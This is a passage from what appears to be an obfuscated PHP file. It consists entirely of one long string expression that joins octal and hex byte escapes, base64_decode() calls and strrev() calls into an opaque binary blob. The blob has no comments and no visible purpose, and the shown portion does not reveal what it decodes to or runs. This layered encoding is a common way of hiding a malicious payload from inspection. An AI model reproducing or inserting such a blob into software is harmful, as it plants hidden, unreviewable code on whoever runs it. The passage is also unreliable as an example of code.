304\26\273\247\105\100\163\336\314\353\137\63\71\370\354\222\266"."\xbd\x67\x5a\x69\x62\x3c\x7c\x6c\x67\x38\x91\x54\xdb\xc2\xc9\xd6\x58\x13\x7c\x3d\x1c\x82\x50\xd4\xa4\xdb\x96\x8d\xb6\x8b\xfe\xf4\xc0\xea\xf6\xd0\x1f\xd5\xb0\x9b\xa5\x63\x5\x47\x39\xfa\x51\xcd"."\324\0\132\214\66\235\341\330\136\212\243\43\71\255\117\102\362\70\25\307\332\114\113\167\247\210\243\152\251\221\341\147\4\212\266\352\106\137\77\314\227\201\133\113\233\131\323\322".base64_decode('shgzsk2hM2zVZwC2AiQsIgkjV2CddfqLuZQUBGzv8JPKRpDEwv0mP9lMC0J1Qagy').strrev('é÷ÂoÛSArÕ8˜å×MuZr¸¦“GlPÏNÈ$ÊÓ™Œù _ú:b`ıá™¶©').strrev('è²,¡1KâÎôbj;'."\r".'©8ªPû¢¯—­gÇĞÅ˜Àìëô¼ÙÕŒËÖ7ŞEK¬')."\x84\x8a\x91\x15\x17\xf1\xe\x4b\xef\x35\x60\x93\xe6\xd1\x8a\xb4\x69\xd6\x20\x1b\x3\x5a\x1\x1\x2b\x38\x22\xc1\x51\x73\x67\x34\xaa\x36\xc6\xda\x93\x88\xa4\xa6\x29\x4b\xe3\x91\x64\x98\xc1\x6d"."\xa8\x49\xd\x35\x76\xf0\x83\x57\xac\x28\x14\xc0\x8\xa6\xf4\xf4\xa0\x29\xc3\xb5\xb0\xb2\xa8\x3b\x41\x71\xcc\x21\x8c\x5d\x30\xf3\xb6\xee\x4f\x43\xd\x41\x7a\x97\x64\x65\xc4\x29\x0\x78\x46\x9c"."\34\236\303\140\324\257\345\306\375\71\264\5\374\274\243\356\63\130\111\312\107\171\4\326\106\40\167\74\215\210\53\142\207\177\107\54\1\25\26\342\124\104\200\245\164\13\76\326"."\xd1\x9\x59\x39\x9\x2e\x5a\xc2\x90\xb8\x1f\x3b\xcf\x35\x20\xab\x42\x4b\x13\xc\x31\x17\x51\x79\xcb\x18\xd7\xc4\x90\x16\xb2\xfe\xb0\x81\xe4\xb2\x82\x9e\x73\x8f\xca\x2f\x66\x3e\xd9\x1a\x69\x5f"."\254\266\305\232\302\121\65\322\216\60\123\262\64\275\263\243\51\304\226\122\116\157\210\45\133\135\251\235\10\67\55\11\105\43\336\342\341\145\221\104\62\121\66\13\245\165\206\75"."\71\210\21\354\210\207\233\43\313\170\264\71\22\216\66\45\324\306\120\143\253\50\323\36\152\203\210\332\213\131\61\73\350\56\257\42\44\233\340\14\235\72\214\231\123\66\131\252"."\213\207\122\31\167\240\12\30\102\207\251\16\220\6\303\305\54\61\31\11\60\304\151\263\310\216\0\116\110\346\30\146\310\151\260\211\64\166\120\126\321\237\152\45\224\120\234\202"."\312\161\100\152\214\7\311\60\130\34\221\214\360\175\5\20\176\111\17\124\134\246\101\357\345\170\270\174\102\250\327\341\350\336\23\107\300\57\362\320\12\204\10\357\215\40\201\254"."\10\174\306\100\133\311\162\102\254\73\275\202\357\125\143\35\341\170\10\163\315\352\322\170\254\275\5\52\214\364\353\254\3\21\230\376\52\106\134\1\363\354\10\64\204\50\43\215"."\x71\x51\x62\xd2\x7\x4c\x36\x95\xab\xe8\xcf\x64\xfa\x83\x88\x42\xf8\xb8\x9e\x67\xb3\x9e\xc2\x18\x99\x9d\x2e\x2c\xd0\x8b\x76\x3\xc3\xa6\x66\x91\x7f\x2d\x65\x9a\x59\xb6\x4f\x11\x7d\xc0\x11\x6"."\147\276\7\154\6\44\243\14\325\114\145\7\24\234\12\311\330\342\160\273\312\40\213\306\44\150\244\11\210\235\215\305\141\102\34\163\220\361\144\64\63\36\116\260\135\156\351\103"."\x45\x83\x4d\x57\x30\x30\x15\xa0\x58\x47\x7\xf\x7c\x3e\x78\x7c\xf7\xc8\xd4\xaa\x2e\xff\xd4\x40\xf\xa\x54\x4f\x59\x44\xa3\x10\xeb\xe\xb8\xa2\x47\x43\xfd\xa2\xc5\x6b\x63\xb2\xa9\xca\x5e\x58".strrev('ŸíÔœ/wÔı¬ş@±›ëYYèHTõ@îÔÏ\\ÿ4øÿ5Çù'."\n".'ë¬-Vì×]')."\x7c\xc2\x8a\x45\x5d\xdd\x3d\x95\x75\x53\x8f\xea\xe\xfc\xac\x7b\xa4\x67\x4a\xf5\x42\xf6\x9d\x74\xd1\x42\xfc\x66\x7a\x8c\x77\x35\x33\xb5\xa\x75\x9\x91\x53\xbc\x48\x9e\xa0\x3c\xa9\x0\xcb\x18"."\67\12\42\165\345\254\325\54\35\255\241\336\47\152\164\371\273\247\366\54\224\352\111\111\336\157\41\162\11\341\337\176\136\56\344\77\16\217\214\127\305\373\36\340\243\230\117\13"."\354\211\367\105\112\113\3\36\60\372\362\174\13\241\223\234\363\351\156\52\176\345\44\372\273\232\55\144\237\76\312\120\103\276\327\260\0\72\213\171\143\210\211\41\362\372\20\4"."\x4c\x87\xc1\x77\x4a\x77\x46\x74\x6\x1e\x28\xdd\x15\x47\xc0\xc1\x58\x47\x94\x25\xc5\xb2\x84\x30\x84\x2f\x60\x86\x8a\xc3\x28\x7\x26\xa3\xa0\x62\xa\x6b\x84\xc7\x32\x7a\x1e\xd6\x69\x5f\x28\x6d".strrev('–[¢ƒB¬¡íó°+pH~Q44;"àlV	Å˜˜2¬4CPÉª¨F‚µ§')."\x69\xd5\x11\xe9\xa5\x5d\x2c\x60\x82\xc\x71\x66\xe\x9a\x5b\x5\xf1\xf4\x4a\xfd\x2\x85\x4e\x39\xd4\x53\xe5\x5\x28\x68\x8c\x4e\xc0\xdc\xb6\x2e\x36\x3d\xc6\x50\xd0\xa7\x82\x58\x21\x1b\x91\x51"."\x8c\xba\x9\x56\x75\x77\x17\xbb\xf4\x4c\x4f\x17\x2\x7c\xcd\xdf\xdb\xb3\x72\xfa\xea\x6a\x46\xe5\x7\xbb\xd1\x7f\x2c\x12\x2a\x23\x47\x53\x39\x36\x54\xd1\xf9\x1c\xc0\xfd\xe0\xa2\x14\x57\x84\x67".base64_decode('06hpcRKp4CKiHdPRsq4mkjiFoSZ2cINQga52VGAsfJRLAkiCTts5E89lI5IEDNdI')."\xe8\x4e\x80\x97\xf0\x49\x99\x2a\x8a\xbb\x84\xc1\xf5\x15\xc\xd9\xe7\xd1\x76\x6a\x94\x8e\x3a\x2a\xda\x49\x8c\xd9\x8e\x9e\x73\x49\x2d\x6d\x5d\xb3\xd2\xfd\xcd\xc5\x6c\xd6\xe1\xa4\x7c\xd6\x18\x84"."\57\300\136\1\41\252\37\116\203\251\345\252\66\233\26\343\210\247\100\67\52\246\224\53\30\311\347\21\377\52\203\232\70\144\133\102\210\234\111\52\125\114\340\247\104\332\225\206"."\130\54\32\16\265\53\370\74\207\163\10\21\13\211\160\107\10\35\142\230\267\116\44\303\40\203\214\64\371\131\273\313\374\21\340\260\170\300\200\151\67\13\30\203\250\150\116\124"."\304\311\14\262\265\104\10\321\141\105\101\102\6\61\114\150\372\260\204\310\207\51\15\37\32\203\17\263\107\76\101\273\373\204\300\315\67\154\350\43\44\300\211\155\37\320\340\76"."\x47\xb3\x10\xc1\x80\x89\x64\x8\x46\x9a\x7c\x86\xdd\x44\xd8\x6\xf2\x1\x92\xc5\x3a\xe4\xf4\x63\x39\x48\x56\x1b\xf3\xd1\xce\x45\xf5\x61\x3d\xeb\x63\x5d\xf3\xb1\x1e\xfb\x18\x6f\xe8\x23\xc\x5d"."\23\164\253\23\155\56\350\26\11\42\34\332\357\303\340\204\241\331\47\104\200\76\163\44\257\133\244\10\114\223\340\70\174\202\33\361\365\131\146\261\320\301\276\51\305\150\267\40"."\101\364\231\47\304\115\323\361\61\136\323\47\263\241\320\213\20\333\65\145\247\263\374\150\310\374\173\73\1\153\207\263\112\147\351\33\26\253\164\75\334\54\367\112\332\42\360\364".base64_decode('q9mZ5yojlpdtw6wuYngBRGiJ2MZ4QM3asAx55aCQnTwMjIX0T8h9BSXs5Su9EmH8')."\xd1\xa4\xd6\x97\x90\x3e\xe7\x68\x7d\xec\x5b\x18\x95\xa1\xdc\x9\x8b\xd2\x70\x5c\x4f\x8f\xa5\x5\xa3\xda\x24\xb1\xbf\xee\x98\x7b\x73\x15\x51\x7b\x9\xad\xd7\x33\x48\x1f\xd9\x65\xe5\x76\x48\x79"."\10\340\120\317\27\154\277\175\367\145\63\316\266\2\137\175\327\16\372\346\275\13\243\44\350\62\126\20\4\7\355\54\106\331\11\164\0\66\147\331\24\325\312\331\200\254\175\356"."\x18\xde\x7a\x1\x82\xbc\xc9\xb5\x4a\x82\x4b\x34\xa2\xe1\xe6\xa4\x72\x4c\xc\x61\x3a\xc3\x54\x69\x1d\x15\x17\x56\xc8\x1f\x33\xaf\xb8\xda\x66\xd3\xa5\xd4\x93\x7c\x11\xd7\xf2\x19\x9a\xb2\x2\x9d"."\xa\x2b\xea\x2b\xd8\x47\x2a\x5c\xd5\x5\xd0\xb8\x3b\xe1\x63\x51\xa5\x14\xc\xf1\x74\xcb\x93\x80\x81\x83\xc\x5f\x9c\x64\x2c\x29\x26\xe\xce\x22\x50\x89\x9a\xd\xfc\x1a\x16\x93\x43\x48\x67\x69".base64_decode('YmllKJWQkUhg/XJ9F0fFDmMgoeAP+CS6BiMcv9grUtQ95R6I9By3eIo6jPyYkZcl')."\x5a\x22\x55\x9c\xd8\x82\x60\xc0\x5b\xdd\x23\x83\x6b\x9a\x28\x4c\x8f\x18\x21\x31\xf3\x81\x24\xcd\x97\x35\xf2\x83\xd2\x61\x2e\xc4\x39\xa8\xf7\xb8\xaa\xd4\x77\x68\xc9\xd3\x73\x86\x74\xfd\xae\xd".base64_decode('DUDer1li/hgawrhAiAZxERGVivVqw4J+cdWRkIntjLEOy0F3ozTa5CO/rWjg8g7l').base64_decode('K4JRBytEcRDa/lE0PeiHDCRp+rAsEf3QU55dZpFCDNSLuSa4ssHhJWjPM7INzXEV')."\303\31\100\153\250\222\304\200\343\34\67\102\243\75\11\161\374\216\116\115\164\346\321\60\42\355\263\350\250\263\2\170\213\264\340\3\113\76\53\334\364\106\102\107\143\206\172\242"."\265\104\111\236\134\132\110\213\60\356\27\147\5\233\127\261\303\304\134\213\355\324\47\72\204\247\126\55\355\7\6\340\362\361\146\313\344\164\60\77\366\275\205\32\11\243\311\357".base64_decode('Jz1HtTQfLvKiJEmq4yU0PKmeqFgI1zlDk5goWcvkjHzAoqdZALEPcKfsmybRYgLN').base64_decode('rLTJuQCn32rPOjumiXhSK2ChL4sOSSgO8AO5csTHoExB8FZslCEhazehxGomChrD')."\xd1\xc0\x71\x14\xf9\x67\x38\x55\x7\x58\xca\x48\xf\x8a\x9d\xaa\xd\x6b\x8\xfe\xa0\x69\x32\x18\xe9\x72\x98\xc4\xa3\x9c\x30\xc6\xb8\x23\x9c\x31\x1c\x9c\x82\x37\xa3\xc9\xe4\xde\xa2\xa0\x38\x31"."\105\232\214\262\311\311\123\262\370\202\313\360\115\162\225\164\323\16\220\70\205\34\351\1\101\352\224\277\146\117\233\5\200\10\111\277\44\147\16\353\122\142\300\166\314\202\310\221".base64_decode('ojRbyhKNSqX4IpEeof2VIQSzmDJSFuoS3ptu4QDmNgIyng5ZFgNgOkx8iYMS5SSM')."\xb\x13\x6c\xf7\x95\x3b\xae\x68\xe3\xe1\x61\xa1\x3d\x42\x9b\xc2\x1f\xe\xd0\xed\x1f\xd0\x32\x99\x18\xbb\xc8\x92\xc3\xa5\x45\x65\x39\x64\xf9\x86\x88\x2a\xf\x6f\x4a\x8a\x95\x2f\x1e\xca\x66\xc5".strrev('å:8ùc,NHË$ÄõQ»ÆKİBnvŞG&q¥Êã®Ëã	šÕ„ÊrJåíºa>7¿õ').base64_decode('+428bvPD2rLL4az/x7Rx6czjHTIRuOA8SWKNtdiGdZmD4GJZgbL4EV5CmABxIEVU')."\xc7\x45\x52\xc5\x49\xfb\xd2\x76\x72\x41\x8\xda\xbe\x74\x3e\xf0\x91\x15\x89\xa1\xed\x59\x1e\x66\xbd\xe5\x74\x26\xb4\x26\x38\x70\x94\x9f\xb4\x72\x25\x9c\x85\xd7\x72\xa2\x46\x79\x3e\x6f\x4c\x90".base64_decode('b3I5BKs4Y6JmWDZv5fmt7295+lEavmfXTadcfRMNzwBWBC6fVu2J/n6LhoXy4ppl')."\135\346\326\307\16\75\241\352\345\327\156\175\342\37\207\237\165\304\23\267\35\335\265\44\361\303\251\357\244\236\272\360\246\357\350\53\203\117\37\364\63\253\352\331\303\255\353\336".base64_decode('eOa8v61efkfbrAOq4853nPU/eO/KvY+7/On8Sd/a95LLv/rt5m1q5vF7z7njhdO1')."\x8b\xec\x2d\x1b\x2e\x9e\xbb\xf3\x8f\x23\x81\xad\xef\x9e\x7f\xe4\xfc\xcf\xdf\x38\xff\xc8\xfd\xbf\xff\xd3\xdd\xfe\x72\xca\xf9\xbb\xfd\x7b\xc6\xbc\x93\x7e\x30\xf9\x9c\x3f\x29\x83\xbb\x6e\x3c\xf4"."\xc6\xbf\xbd\xbc\xee\xd8\x6d\x3f\x7e\x7d\x6c\xd3\x43\xdb\xd3\x7\xec\xdd\x38\x6f\xe6\x92\xc4\x17\x66\xe5\x51\xb7\x9c\xf9\xe1\x45\x67\x57\xdd\xba\xb6\xb1\x75\xce\xb9\x75\x81\xef\xf8\xa6\x54\x2e"."\x5a\x54\x73\xee\x2b\x4f\xb4\x7d\x6f\xdc\xbf\xc7\x4f\xa2\x5a\xf4\xcd\x45\xfe\xb7\x9e\xbf\xff\xdb\xc5\x9b\x6e\x3e\xf2\xa3\x4b\x36\xdc\x9a\xbd\x7f\xf2\x6\x7d\xd3\xb9\x77\xfb\xe\x3b\xdb\xba\xb8".base64_decode('9vENS2oPOHHzjQ8+ePRLX9z+wsYPf/7Xna8dM/OnM175z6oHnh8wlxw3ft6hn52T').base64_decode('iWXnPJ06++UXP04safPZ06p2HKM/NWXStu/3bn52jz+ctPlPL6X32HRB6vd3rLt8').strrev('ké;n›´ÿyöÇšéz¿Eàx¾ºë2›¡ªùõíÕWÄwÅf#±]ÜxGÃ').base64_decode('vpjyx65FL875tNp5+dzNG7a2bFj9+kNH95yy+ffGDxturzv5sXvWtR2V+uyRtw8c')."\76\362\133\207\356\267\347\153\227\245\122\237\354\161\164\323\217\167\175\153\125\346\245\107\256\155\33\172\361\20\145\333\317\217\312\152\153\16\174\42\125\171\126\365\47\347\275\230".base64_decode('Pbz6tin1jz2Re1tpP3hOpv3N9K7djvh456XP7HnRWe990tJx3OzM4x+OH/bnF1cc')."\xa3\x64\x57\x76\xdc\x97\xde\x6b\x9f\x77\xb7\xd6\x2f\xb\xed\x13\xfb\x4f\x36\x70\xeb\x2d\x7\x9c\xfa\xfd\xae\xe3\xda\x5a\x5e\xb9\xcb\x78\xf2\x9a\xc0\x86\x9f\xde\x32\x35\xbf\x22\xf3\xe4\x53\x7"."\xdd\xb8\x6e\xe7\xa3\x1f\xb4\xbf\x98\xdf\x63\xbf\x23\x2e\x9a\xb3\xa8\xca\x7c\xf3\xfa\xf5\xd3\xa6\x1d\xf9\xf2\xf1\x87\xbe\xf4\xcc\xa6\x2d\xf9\x97\xce\xf2\xdf\xbb\xd7\x77\x7\x53\x3b\xea\xd6\x3e"."\161\174\337\344\45\377\32\374\107\50\235\277\374\352\317\43\303\207\206\26\135\335\365\301\57\257\70\360\256\354\310\206\35\357\136\374\273\175\377\264\346\137\373\376\260\372\322\170".base64_decode('y1DdHtPPdV79cNcXba9k1zwROezh3R9etfz21dMWVT9w6gs/eq1uZ03L1t99dOnD')."\327\234\275\147\152\321\376\207\357\365\334\73\77\336\377\271\17\336\334\30\273\343\220\347\76\373\355\5\107\235\162\332\125\33\337\336\157\372\205\147\175\160\360\171\317\237\173\346"."\x1f\xa7\xae\x58\x75\xb0\xfa\xaf\x93\x76\x3f\xf8\x87\xc3\x6b\x5e\x3a\xb9\xf2\xc0\x47\xe7\xfc\xe5\xa4\xbd\xaf\x7a\xe2\xbe\x23\xee\x7f\xec\xa1\x8d\xfa\x1\x6b\x52\xe7\xc4\x5f\xf9\xc9\x40\xc5\x7d"."\376\3\57\377\345\223\25\332\7\115\27\36\367\346\123\7\255\150\171\374\275\255\267\356\265\370\217\326\241\301\165\13\217\155\176\370\336\201\206\157\377\161\305\137\27\77\362\166"."\347\341\277\230\375\367\37\151\77\334\174\361\117\323\157\50\7\136\363\247\137\114\76\166\340\314\347\66\237\227\135\167\343\346\345\317\136\322\271\51\361\226\131\371\364\5\273\266"."\x3e\x70\x70\xeb\xaa\xde\x91\x57\xeb\x23\xcf\xd6\x5c\x3e\xa5\xfa\xcb\x59\x1f\xb4\xbc\x70\x58\x4d\xf7\x45\x2f\xaf\x9a\x16\xb7\x1e\x9a\xd1\xf9\xbd\x3\x7\x3f\xca\xfc\x44\x1f\x8c\x65\xf7\xfc\x24"."\x77\xc1\x9a\xb9\x8d\xd7\x9e\x71\x55\x62\xf7\xf4\x2b\x7\xfc\xbe\x62\xc6\xd\xef\xcd\xfc\xf4\xe3\x63\x7e\xf7\xfc\x82\xe7\x7e\x9d\xdb\x32\xef\x6\xf3\xed\x4d\xc3\xf7\x9f\x78\xe7\xfc\xa3\x5e\xff"."\236\131\265\274\242\345\333\361\355\27\54\13\374\174\323\71\231\117\116\377\347\357\276\273\377\113\367\375\356\40\343\362\311\15\67\375\147\116\56\377\344\101\201\313\207\176\246\217"."\xae\xdd\xfa\xdb\xc1\x7d\xcf\x55\xf7\x69\xd9\xe7\x0\xfd\xbc\xf8\xcb\x9b\xef\xdb\xb1\xfb\xa5\x91\x5b\xe6\x7d\x6f\xf8\xf6\x6f\x7d\xb2\xe3\xc6\x3f\x1f\xf6\xac\x2f\x75\xf2\xc6\x23\xdf\x3b\x6c\xe9".base64_decode('7TuevM+au0m74vqrb2679bQrH7rHuGLttedkt5gX/UT79qlr/nGq8e34Ld/ZeVTV').strrev('üo‹ci†¡ó3¤ä¿]_ß|ü‡cñe±½µ·'."\n".'ñÿ¡õşÌ×ıéñ§zşwôğ?ß')."\x5e\xf6\x47\x57\x5f\xfa\xc3\xa9\x4f\x9d\xf6\x83\xd7\xe2\x97\xa7\x26\xfd\x7a\xe9\xf4\xb5\x3f\xae\xd8\xf0\xf7\xdc\xb\x1f\xfd\x61\x3c\x96\xc8\xfd\xe0\xe7\x3f\x38\xfa\xa0\xe5\xaf\xfc\xf7\x84\x96"."\367\237\77\342\343\343\67\125\316\70\154\367\27\56\270\376\226\173\157\376\170\171\164\327\363\357\75\371\345\11\233\56\170\344\214\335\56\335\317\370\305\376\47\175\362\320\234\55"."\176\163\367\167\376\376\136\303\337\27\315\71\160\262\257\176\363\375\203\47\137\62\66\377\360\226\363\37\255\70\350\171\363\250\45\53\33\337\375\237\247\267\76\275\263\141\164\313".base64_decode('t95ffNwboe98uexx/y1XHjDroDrnlhsKew93XNH/6r1PvbXy7v1vPye4MRDwvbr8')."\236\203\53\277\325\72\220\75\340\371\206\323\236\375\334\274\364\67\137\175\376\253\137\335\374\345\11\237\377\373\255\107\325\313\116\370\327\27\217\156\177\347\205\367\217\337\374\345"."\77\337\335\376\340\226\5\243\103\137\276\365\132\340\370\315\367\175\266\365\346\215\217\237\276\162\345\43\263\117\370\352\332\75\157\373\342\366\253\137\373\350\263\346\304\344\337\136"."\x7e\xf4\xc9\xf3\xdf\x69\x78\x72\xb7\xf9\x1b\xd7\x9e\xd4\xba\xf6\xc1\xef\xdf\x75\xce\x6d\xc7\x3f\xd1\x1c\xb8\xb1\x7b\x8f\x59\x7b\xbd\xba\xeb\xb1\xdd\xf7\x78\x6c\xce\x1f\xeb\xbe\xf3\xec\xe4\x3b"."\x5f\x3c\x71\x69\x7b\xdf\xab\xcf\xef\x73\xf0\x7f\xe\xf9\xed\xbf\x7\x6b\x8e\xb8\xd6\x7f\xcd\x79\xd\xb7\xbe\x7e\xf5\xf7\xa7\x5c\xdd\x71\xde\x13\x3d\x56\x41\x59\xbf\xfe\x98\xfc\x7e\x4b\x3e\x8d"."\xe\xfe\xb3\xea\x5f\x5b\x1e\x7e\x6e\xeb\x35\xf7\xaf\x1f\x9f\x5b\x79\x50\xf6\x8a\x8b\x4e\x7c\xe0\x96\x3b\xee\xb9\xff\xcf\xcf\xc\xe8\x4f\xcd\x6f\xff\xe1\xe1\xaf\x8e\xac\x5a\x7d\xf4\x9e\xe7\xfc".base64_decode('YfLKO//96BttNc0nzLyt55Bv/Wv892evumb9tou/vyRTe9tPb71rzrwVJ+zf1HnQ')."\272\212\3\207\53\262\172\367\272\173\262\177\71\41\263\374\47\53\377\265\51\175\303\336\227\256\335\267\355\225\275\323\312\7\271\37\357\372\356\262\361\143\377\323\364\104\363\141"."\33\262\133\163\17\276\365\310\53\67\155\173\361\117\237\376\370\201\43\177\61\317\76\252\347\306\251\27\132\217\75\260\43\372\275\263\237\310\116\272\366\316\223\177\377\27\345\323"."\xa9\x1f\xaf\x3d\xf3\xf7\xed\x73\xf7\xec\xbb\xb6\xe5\xb8\x67\x6e\x1a\xee\x5b\xf3\xf4\x27\x5b\x8c\xeb\x77\x7d\x77\xf2\x3b\xff\x5d\x72\xff\xcb\xb9\x6d\xad\x7b\xfe\x64\xdb\xae\x67\xff\x7b\xc1\x19".base64_decode('0y/eMnnTTePqp2+fefjJFz9x3JZXXzr+1beX3/HC9p03vnb8cd1VLxx+5buJKRue')."\x3c\xe8\x93\xd6\x4f\x7c\xd9\xb5\xf7\x7c\x72\xeb\xce\xa9\x95\xcb\x56\x36\x2d\xbf\xec\xa2\x7d\xbb\xce\xbc\xec\x6f\xa9\xc8\x9a\x9e\x43\xf6\x99\xfa\xaf\x7f\xd6\xcc\xd9\x7d\x73\x28\x7b\xf6\x93\x87"."\277\167\370\33\217\274\71\357\312\332\165\357\75\134\31\376\154\270\56\323\331\363\162\360\57\207\377\373\220\163\6\302\53\212\117\376\364\210\314\1\7\176\177\315\17\336\171\165"."\171\254\341\203\175\17\274\142\366\76\347\371\77\133\360\333\51\203\165\137\26\326\337\164\351\36\325\257\177\126\135\267\356\231\253\356\261\216\72\170\364\202\246\175\332\257\250\277"."\375\325\143\224\253\136\315\344\364\223\37\76\365\261\237\36\176\252\162\346\256\355\7\57\130\376\110\352\117\146\327\205\317\355\335\262\365\256\365\331\37\35\366\376\176\55\277\370"."\xf0\xca\xe7\x5f\xa9\xbd\xf3\xb6\x1d\x37\xbc\x15\x5e\x96\xff\x5e\xcf\xc7\xbe\x7\xbf\xdc\xed\xd4\xe9\x2f\xed\x78\xe8\xe2\xb5\x17\x5d\xbe\xeb\xe8\xdb\xb5\xe1\xda\xa3\x4e\x9e\x71\xe8\x3e\xf\xed"."\335\377\217\127\116\270\160\323\21\257\36\275\356\252\273\236\354\170\132\375\313\373\247\75\376\223\337\214\207\377\120\173\106\347\37\116\333\172\303\176\313\116\133\267\376\274\65\167".base64_decode('Klrgzysqci/fMLN28SnPX3Lrjvj0u/+8YcGLT/5m2PhcO9D54I03dnwQ2tK19973')."\x3b\xf7\xdc\x9e\x78\x2b\xfa\xcc\x1d\x67\x7c\x3c\x7e\x7f\xcd\x87\x1f\x3d\xfb\xb7\x54\x78\xf0\x39\xff\xc5\x9f\xbe\xea\x1f\x1c\x9e\xf2\xfa\xe1\xda\xdd\x1d\x7f\xfb\xfb\x4d\x33\x9f\x7c\x67\xfd\xe2"."\263\217\134\137\127\334\373\256\315\147\47\263\257\374\265\373\323\25\25\227\35\323\174\345\21\67\76\376\314\366\327\356\232\161\316\211\363\276\270\375\222\305\273\17\207\237\253\237"."\xeb\xef\xf7\xef\xfd\xf9\xc6\xee\x49\xf7\x3d\xbf\xb1\x7f\xd2\x7d\x7b\x5f\x10\xd8\xab\xf1\x8b\xb5\x57\x4f\xbd\xf4\xba\xb1\xe2\xdf\x2f\xf9\xec\xc2\xbf\xec\x77\xef\xb\xf7\xc5\xc3\x4f\xae\xfb\xea"."\311\155\235\337\73\357\45\377\333\47\46\256\217\376\165\315\372\235\137\315\77\361\223\355\237\277\277\360\376\57\336\174\241\357\310\23\212\237\74\370\332\157\126\177\364\341\243\55"."\x7f\xda\xf2\xd5\x47\xef\x9b\xc7\xaf\xb2\x3e\x79\x77\xfd\x2d\x1\x75\xc1\xea\x13\x3e\xbc\xec\xe6\x3f\xbc\x76\xf3\x57\xd6\x87\x6f\x6f\x7f\xb4\xf2\xc8\xd\xff\xfd\xe4\x80\xbe\x23\x4f\x1c\xfd\xf0"."\371\205\201\205\137\175\364\325\127\377\75\143\351\300\261\227\277\226\376\311\61\7\354\141\157\31\237\176\331\251\341\17\376\372\330\115\167\177\376\267\127\336\337\367\62\163\311\340".strrev('—	ì­ÿ9NÅ§m»÷V5­İë?g¢â±]¬§—×`ÿ^¯¸ò³‡û_»Îû»îØuıÇ')."\164\75\361\303\165\277\33\274\346\143\253\167\353\377\74\34\37\132\132\161\372\77\377\164\130\103\354\365\345\47\34\370\130\372\325\324\357\257\234\67\145\363\57\46\357\331\365\330"."\143\227\206\166\324\256\15\315\336\170\357\344\357\376\317\153\173\234\360\306\224\247\316\70\204\331\131\144\6\265\142\52\17\64\145\315\254\331\100\27\115\3\212\150\326\214\131\64"."\x0\x6a\x42\xd3\xe7\xd2\xdf\xda\x59\xa0\xa8\x5\x4\xd4\xcc\x69\x10\x77\x6\x7b\x47\xfb\x6\x40\xe0\x35\x83\x15\xaf\x99\xcd\x8\xad\xe9\xd0\xf0\xc8\x60\xc1\xea\xcb\x0\xd1\x3f\x9d\x51\x63\xd0"."\310\254\331\360\271\224\345\214\216\214\103\251\31\364\147\310\166\212\3\175\114\60\224\356\37\321\123\40\201\230\75\33\76\67\173\46\364\272\267\70\246\33\203\300\76\325\316\236"."\305\232\237\316\2\320\346\214\231\60\360\351\214\42\234\61\13\156\233\147\325\262\300\14\50\134\63\23\76\243\33\243\375\103\175\240\310\347\130\303\143\3\343\20\231\75\13\6"."\x30\xbb\x6\x2\x23\xa3\xfd\x96\x9e\x5\x29\x62\xd1\xd0\xcc\xc1\x7e\x90\xa3\x15\xc7\x73\x83\x79\xd\xae\xf8\x7a\x1d\x7b\xc0\xcc\xc1\x5\x7a\x26\x67\x8c\x98\xd6\x0\x9b\x39\xe8\x87\xa1\x3b\x69".strrev('ãeÎÄq­7ëDgL#ÒÆgÈİ©Z³ÁõzGf†ĞthkyÀ æã#}RE;').base64_decode('G0mlC4zdqqmFsc6cA3PmpMZ7h0aY2MAZGrcGgJFPj9nm6Di0nTKH8sVRgIPZc+aw').strrev('Æ4½!—€\\öbfË³€â©ãıÄÀ9¬©½« sµ‹áÑ§^µ²xæ³Méy')."\x69\xa4\x4f\x1f\x2f\xf6\x8e\x40\xd3\xb5\xcc\x56\xa2\x90\x1f\x18\xb1\x61\xfa\xe7\x4c\x87\x4f\x14\xd2\x43\xe3\x3\x29\x9d\xa5\x42\xd9\xbe\xde\x81\xf4\x28\x53\x4c\xa9\x61\x3d\x9e\x5b\x3\xd0\x63"."\146\323\251\114\37\314\177\21\115\225\323\307\364\370\323\105\53\65\10\220\71\203\201\374\300\260\226\115\131\151\6\126\60\237\132\76\63\74\126\200\126\246\117\203\262\271\376\301"."\361\124\357\10\233\65\6\316\323\140\300\163\147\301\356\231\311\166\112\315\114\110\31\114\367\353\226\306\64\75\306\235\202\71\4\40\65\230\161\6\214\176\230\234\221\361\176\133"."\323\373\330\136\35\36\267\330\116\32\350\115\345\206\6\1\136\254\261\342\220\231\202\326\20\133\65\64\76\310\346\236\355\235\231\154\115\147\324\300\276\30\323\7\6\123\103\200"."\112\246\63\160\252\251\141\50\243\206\341\24\310\311\367\133\271\341\136\230\347\341\361\134\141\154\24\42\271\21\173\150\260\327\142\33\220\15\321\30\111\363\35\226\312\215\16\25".strrev('@­¯”&w2<HalùPzf‹,YŠg‘¢™Z/‡è1ÏìŞ@ìõ°ZÜímº˜')."\xe9\xcb\xe\xc\xf7\x33\x58\xec\xb3\x87\xc7\x7a\xb\x19\xb6\x41\x0\x2c\x34\xbb\xd8\x3b\xee\x30\x6d\x3b\x4d\xe8\xac\xe2\x90\x10\xb9\xd1\x1c\xac\x80\x1e\x91\x2c\x58\xd4\x3e\xdd\x51\x41\x93\x13".base64_decode('lqAhlIg0qh0hpn+oFQpBOzNoB7F2gDGsR41UEFt0YAOzALd5QFCQHlS1lGk5TIZT').base64_decode('xBYB0PXlOUhs0NKDTJiMmGinaHsKcEuffCCn5blKTivoj6Rl7XC5wKCuM71iprks')."\x74\x3e\xec\x22\xb1\xad\x80\x74\x23\xa7\xb\xa9\x38\xbd\x87\x60\x35\x5\xd7\x8f\x67\x4e\xd2\x1a\xc1\xd1\x84\xdc\x4a\x3a\xef\x48\xd9\x28\xe6\xca\x4d\x38\xa6\xc5\xf5\x54\xa8\x6\x5c\x0\xf7\x30"."\340\36\63\73\355\312\134\141\202\274\327\266\21\46\206\251\31\64\63\351\254\131\314\270\132\315\244\134\155\362\124\46\246\360\346\364\116\220\216\332\161\51\371\262\64\327\144\245"."\310\352\251\162\44\300\246\73\45\255\54\25\325\73\232\75\30\220\223\375\162\256\221\107\275\310\146\3\156\103\105\225\374\7\163\100\215\341\154\175\250\250\347\305\365\267\75\50"."\x4d\x3c\xb6\x30\xec\xec\x50\x93\xa1\xc4\x62\x49\x4d\x10\x5b\xc0\x31\x70\x52\xc5\x8e\x90\x86\x25\x5a\x90\xe6\x51\x5e\x41\xf7\x14\x30\x8\xd9\x75\xf3\xfd\xdb\xcf\xbe\x70\xc7\x5\xb7\xec\x38\x73"."\343\366\373\316\337\265\361\226\355\233\56\100\321\155\367\234\265\175\343\245\157\135\274\146\333\75\147\156\273\347\244\135\153\357\170\377\201\63\266\237\175\363\256\123\66\155\337\160"."\335\366\253\327\156\273\1